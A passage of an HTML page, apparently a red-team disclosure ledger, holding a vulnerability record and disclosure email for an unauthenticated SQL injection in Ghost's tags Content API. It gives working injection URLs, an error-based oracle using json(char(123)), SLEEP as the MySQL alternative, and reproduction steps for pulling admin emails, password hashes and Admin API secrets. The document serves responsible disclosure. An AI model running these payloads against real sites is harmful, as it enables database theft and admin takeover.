D%7D%7D%5Cn%5Cnand%20the%20second%20will%20return%5Cn%5Cn%20%20%7B%5C%22errors%5C%22%3A%5B%7B%5C%22message%5C%22%3A%5C%22Request%20not%20understood%20error%2C%20cannot%20list%5Cn%5Cntags.%5C%22%2C%5C%22context%5C%22%3A%5C%22Could%20not%20understand%5Cn%5Cnrequest.%5C%22%2C%5C%22type%5C%22%3A%5C%22BadRequestError%5C%22%2C%5C%22details%5C%22%3Anull%2C%5C%22property%5C%22%3Anull%2C%5C%22help%5C%22%3Anull%2C%5C%22code%5C%22%3A%5C%22SQLITE_ERROR%5C%22%2C%5C%22id%5C%22%3A%5C%2216486360-0a45-11f1-99ce-15113e120122%5C%22%2C%5C%22ghostErrorCode%5C%22%3Anull%7D%5D%7D%5Cn%5CnThe%20reason%20this%20happens%20is%20that%3A%5Cn%5Cn%20%20-%20In%20the%20TRUE%20condition%2C%20the%20inner%20CASE%20returns%201%2C%20and%20json%28char%28123%29%29%20is%5Cn%5Cnnever%20evaluated%5Cn%5Cn%20%20-%20But%20in%20the%20FALSE%20condition%2C%20the%20inner%20CASE%20hits%20the%20ELSE%20branch%2C%20which%5Cn%5Cnevaluates%20json%28char%28123%29%29%20which%20is%20json%28%27%7B%27%29.%20That%27s%20malformed%20JSON%20and%20so%5Cn%5Cnwe%20get%20an%20error.%5Cn%5CnThis%20can%20therefore%20be%20weaponized%20to%20leak%20arbitrary%20bits%20from%20the%20server.%5Cn%5CnFor%20example%2C%20I%20can%20learn%20if%20the%20login%20email%20address%20has%20length%20%3E10%20by%5Cn%5Cnrunning%5Cn%5Cnhttp%3A//localhost%3A2368/ghost/api/content/tags/%3Fkey%3Dbd6a3bb3d48a98345e5bc45b5a%26filter%3Did%3A69917d0f084446000139092c%2Cslug%3A%5B%2527%2520OR%2520%28SELECT%2520CASE%2520WHEN%2520%28length%28%28SELECT%2520email%2520FROM%2520users%2520LIMIT%25201%29%29%253E10%29%2520THEN%25201%2520ELSE%2520json%28char%28123%29%29%2520END%29%2520%253E%25200%2520OR%2520slug%253D%2527%5D%26limit%3Dall%5Cn%5CnOn%20production%20MySQL%20you%20will%20need%20to%20find%20a%20different%20distinguisher%3B%20SLEEP%5Cn%5Cnshould%20probably%20work%20well.%5Cn%5CnThe%20complete%20PoC%20%28this%20was%20entirely%20Claude-generated%2C%20but%20I%20can%20confirm%20it%5Cn%5Cnruns%20correctly%20to%20extract%20the%20keys%20on%20my%20machine%29%20attached%20will%20run%20and%5Cn%5Cngive%20you%20an%20output%20like%20this%3A%5Cn%5Cn%20%20RESULTS%20%282611%20requests%2C%20all%20unauthenticated%29%5Cn%5Cn%20%20%20%20Admin%20email%3A%20%20%20%20%20%20ghost%40example.com%5Cn%5Cn%20%20%20%20Admin%20name%3A%20%20%20%20%20%20%20Ghost%5Cn%5Cn%20%20%20%20Account%20status%3A%20%20%20inactive%5Cn%5Cn%20%20%20%20Bcrypt%20hash%3A%5Cn%5Cn%20%242a%2410%24bxMGUVG0Ri01r1Q7aQeUsONwCOGzqRkUkpLJc/qDYCP7.xm5WcSM2%5Cn%5Cn%20%20%20%20Admin%20API%20secret%3A%20ecc977514394124affaf7148d350a4%5Cn%5CnWith%20this%20Admin%20API%20secret%2C%20you%20can%20now%20do%20very%20bad%20things.%5Cn%5CnPlease%20let%20me%20know%20if%20you%20have%20additional%20questions%3B%20I%20would%20be%20happy%20to%5Cn%5Cndiscuss%20them%20over%20email%20or%20get%20on%20a%20call%20with%20you.%5Cn%5CnThanks%2C%5Cn%5CnNicholas%22%2C%22title%22%3A%22Critical%20Vulnerability%20%28CVSS%209.1%29%20%3A%20SQLi%20from%20unauthenticated%20user%3B%20arbitrary%20DB%20reads%22%2C%22vendor_severity%22%3Anull%7D">Verify (download preimage.json)</a>
+</p>
+<details class="preimage">
+  <summary>Show preimage JSON</summary>
+  <pre class="preimage-body">{
+  &#34;ant_id&#34;: &#34;ANT-2026-69D8H6RP&#34;,
+  &#34;bug_class&#34;: &#34;SQL Injection&#34;,
+  &#34;claude_severity&#34;: &#34;critical&#34;,
+  &#34;commit_sha&#34;: null,
+  &#34;created_at&#34;: &#34;2026-05-14T22:41:22+00:00&#34;,
+  &#34;description&#34;: &#34;Ghost&#39;s Content API input serializer (slugFilterOrder in slug-filter-order.js) builds a raw SQL ORDER BY clause using string template literals containing the unsanitized `filter` query parameter. An attacker with only the public Content API key — which is embedded in the site&#39;s HTML as `data-key` — can craft a `filter=...slug:[...]` value on the /ghost/api/content/tags/ endpoint that injects arbitrary SQL. Using a boolean/error-based oracle (json(char(123)) on SQLite, SLEEP on MySQL), the attacker can exfiltrate arbitrary database rows bit-by-bit with no authentication. A working PoC extracts the admin email, bcrypt password hash, and Admin API secret in ~2600 requests; the leaked Admin API secret then grants full administrative control (create admin users, upload themes, manage all content).&#34;,
+  &#34;discovered_at&#34;: &#34;2026-02-15T00:31:39+00:00&#34;,
+  &#34;location&#34;: &#34;core/server/api/endpoints/utils/serializers/input/utils/slug-filter-order.js (slugFilterOrder)&#34;,
+  &#34;poc_sha256&#34;: null,
+  &#34;preimage_version&#34;: 1,
+  &#34;project&#34;: &#34;TryGhost/Ghost&#34;,
+  &#34;reproduction&#34;: [
+    &#34;1. Load the Ghost front-end and extract the Content API key from the `data-key` attribute in the page source.&#34;,
+    &#34;2. Call /ghost/api/content/tags/?key=KEY&amp;fields=id,slug&amp;limit=1 to obtain a valid tag ID.&#34;,
+    &#34;3. Request /ghost/api/content/tags/?key=KEY&amp;filter=id:TAG_ID,slug:[&#39; OR (SELECT CASE WHEN (&lt;cond&gt;) THEN 1 ELSE json(char(123)) END) &gt; 0 OR slug=&#39;]&amp;limit=all — a TRUE condition returns tag JSON, a FALSE condition returns a SQLITE_ERROR BadRequestError.&#34;,
+    &#34;4. Iterate the boolean oracle over subqueries (e.g. SELECT email/password FROM users, SELECT secret FROM api_keys) to extract values character-by-character; on MySQL substitute a time-based distinguisher such as SLEEP().&#34;,
+    &#34;5. Use the recovered Admin API secret to authenticate to the Admin API and create admin users / upload themes.&#34;
+  ],
+  &#34;technical_details&#34;: &#34;Hi,\n\nI am a security researcher at Anthropic. I am using LLMs to find\n\nvulnerabilities in open source software, and have spent a little bit of\n\ntime looking at Ghost. I believe I have found a bug that is extremely\n\nserious. While an LLM found this bug initially, I manually validated the\n\nbug myself and wrote this email and also tried to write a patch myself.\n\nThe vulnerability is in the slugFilterOrder function in\n\ncore/server/api/endpoints/utils/serializers/input/utils/slug-filter-order.js\n\n&lt;https://github.com/TryGhost/Ghost/blob/main/ghost/core/core/server/api/endpoints/utils/serializers/input/utils/slug-filter-order.js&gt;,\n\nwhich directly takes user input from the filter query parameter and\n\nconstructs a raw SQL ORDER BY clause via string template literals.\n\nUnfortunately, this leads to a SQLi that allows anyone to remotely read\n\narbitrary data from the database. This is distinct from CVE-2026-22596\n\nwhich was recently filed.\n\nI have a working PoC, attached to this email, that extracts the admin\n\nemail, bcrypt password hash, and even the Admin API secrets when running on\n\nthe latest Ghost 6. (Note that an attacker with the extracted Admin API\n\nsecret can then create admin users, upload themes, and manage all content.)\n\nTo reproduce, start by running Ghost locally with Docker:\n\n  docker run -d -p 2368:2368 ghost:latest\n\nThis should bring up Ghost version 6.18.2. From here you should be able to\n\nvisit\n\n  http://localhost:2368\n\nInspect the source code and find the data-key, this will look like\n\n  data-key=\&#34;bd6a3bb3d48a98345e5bc45b5a\&#34;\n\nThen figure out a valid tag ID\n\nhttp://localhost:2368/ghost/api/content/tags/?key=YOUR_KEY&amp;fields=id,slug&amp;limit=1\n\nthen visit these two URLs which behave differently and prove the SQLi:\n\nhttp://localhost:2368/ghost/api/content/tags/?key=YOUR_KEY&amp;filter=id:YOUR_TAG_ID,slug:[&#39;\n\nOR (SELECT CASE WHEN (1=1) THEN 1 ELSE json(char(123)) END) &gt; 0 OR\n\nslug=&#39;]&amp;limit=all\n\nhttp://localhost:2368/ghost/api/content/tags/?key=YOUR_KEY&amp;filter=id:YOUR_TAG_ID,slug:[&#39;\n\nOR (SELECT CASE WHEN (1=0) THEN 1 ELSE json(char(123)) END) &gt; 0 OR\n\nslug=&#39;]&amp;limit=all\n\nThe first of these requests will return\n\n{\&#34;tags\&#34;:[{\&#34;id\&#34;:\&#34;69917d0f084446000139092c\&#34;,\&#34;name\&#34;:\&#34;News\&#34;,\&#34;slug\&#34;:\&#34;news\&#34;,\&#34;description\&#34;:null,\&#34;feature_image\&#34;:null,\&#34;visibility\&#34;:\&#34;public\&#34;,\&#34;og_image\&#34;:null,\&#34;og_title\&#34;:null,\&#34;og_description\&#34;:null,\&#34;twitter_image\&#34;:null,\&#34;twitter_title\&#34;:null,\&#34;twitter_description\&#34;:null,\&#34;meta_title\&#34;:null,\&#34;meta_description\&#34;:null,\&#34;codeinjection_head\&#34;:null,\&#34;codeinjection_foot\&#34;:null,\&#34;canonical_url\&#34;:null,\&#34;accent_color\&#34;:null,\&#34;url\&#34;:\&#34;\n\nhttp://localhost:2368/tag/news/\n\n\&#34;}],\&#34;meta\&#34;:{\&#34;pagination\&#34;:{\&#34;page\&#34;:1,\&#34;limit\&#34;:100,\&#34;pages\&#34;:1,\&#34;total\&#34;:1,\&#34;next\&#34;:null,\&#34;prev\&#34;:null}}}\n\nand the second will return\n\n  {\&#34;errors\&#34;:[{\&#34;message\&#34;:\&#34;Request not understood error, cannot list\n\ntags.\&#34;,\&#34;context\&#34;:\&#34;Could not understand\n\nrequest.\&#34;,\&#34;type\&#34;:\&#34;BadRequestError\&#34;,\&#34;details\&#34;:null,\&#34;property\&#34;:null,\&#34;help\&#34;:null,\&#34;code\&#34;:\&#34;SQLITE_ERROR\&#34;,\&#34;id\&#34;:\&#34;16486360-0a45-11f1-99ce-15113e120122\&#34;,\&#34;ghostErrorCode\&#34;:null}]}\n\nThe reason this happens is that:\n\n  - In the TRUE condition, the inner CASE returns 1, and json(char(123)) is\n\nnever evaluated\n\n  - But in the FALSE condition, the inner CASE hits the ELSE branch, which\n\nevaluates json(char(123)) which is json(&#39;{&#39;). That&#39;s malformed JSON and so\n\nwe get an error.\n\nThis can therefore be weaponized to leak arbitrary bits from the server.\n\nFor example, I can learn if the login email address has length &gt;10 by\n\nrunning\n\nhttp://localhost:2368/ghost/api/content/tags/?key=bd6a3bb3d48a98345e5bc45b5a&amp;filter=id:69917d0f084446000139092c,slug:[%27%20OR%20(SELECT%20CASE%20WHEN%20(length((SELECT%20email%20FROM%20users%20LIMIT%201))%3E10)%20THEN%201%20ELSE%20json(char(123))%20END)%20%3E%200%20OR%20slug%3D%27]&amp;limit=all\n\nOn production MySQL you will need to find a different distinguisher; SLEEP\n\nshould probably work well.\n\nThe complete PoC (this was entirely Claude-generated, but I can confirm it\n\nruns correctly to extract the keys on my machine) attached will run and\n\ngive you an output like this:\n\n  RESULTS (2611 requests, all unauthenticated)\n\n    Admin email:      ghost@example.com\n\n    Admin name:       Ghost\n\n    Account status:   inactive\n\n    Bcrypt hash:\n\n $2a$10$bxMGUVG0Ri01r1Q7aQeUsONwCOGzqRkUkpLJc/qDYCP7.xm5WcSM2\n\n    Admin API secret: ecc977514394124affaf7148d350a4\n\nWith this Admin API secret, you can now do very bad things.\n\nPlease let me know if you have additional questions; I would be happy to\n\ndiscuss them over email or get on a call with you.\n\nThanks,\n\nNicholas&#34;,
+  &#34;title&#34;: &#34;Critical Vulnerability (CVSS 9.1) : SQLi from unauthenticated user; arbitrary DB reads&#34;,
+  &#34;vendor_severity&#34;: null
+}</pre>
+</details>
+</main>
+<footer>
+  <p>Anthropic Frontier Red Team</p>
+  <p>Snapshot generated at 2026-11-02 19:30 UTC</p>
+  <p>Dates and times are in UTC</p>
+  <p>Manifest hash <code>25d811e7b56632ef5bbb23eb…</code></p>
+  <p>Archived snapshots remain available at their dated paths so any figure can be verified against the page that was live on that date</p>
+  <p><a href="../data/payload.json">payload.json</a></p>
+</footer>
+<script src="../assets/figures.js" data-root="../"></script>
+<script src="../assets/ledger.js"></script>
+</body>
+</html>
